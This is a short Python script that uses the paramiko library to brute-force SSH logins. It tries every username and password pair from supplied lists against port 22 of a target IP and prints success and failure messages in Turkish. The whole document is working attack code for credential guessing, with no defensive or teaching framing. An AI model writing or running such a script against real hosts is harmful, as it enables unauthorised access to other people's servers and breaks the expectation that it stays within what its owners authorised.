import paramiko

ssh = paramiko.SSHClient()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

def ssh_brute_force(ip, username_list, password_list):
    for username in username_list:
        for password in password_list:
            try:
                ssh.connect(ip, username=username, password=password, banner_timeout=200, timeout=10, port=22)
                print(f"[+] Başarılı: {username} - {password}")
                ssh.close()
                break
            except paramiko.AuthenticationException:
                print(f"[-] Başarısız: {username} - {password}")
            except paramiko.SSHException as e:
                print(f"[-] SSH hata: {username} - {password} - {e}")
            except Exception as e:
                print(f"[-] Bilinmeyen hata: {username} - {password} - {e}")
                break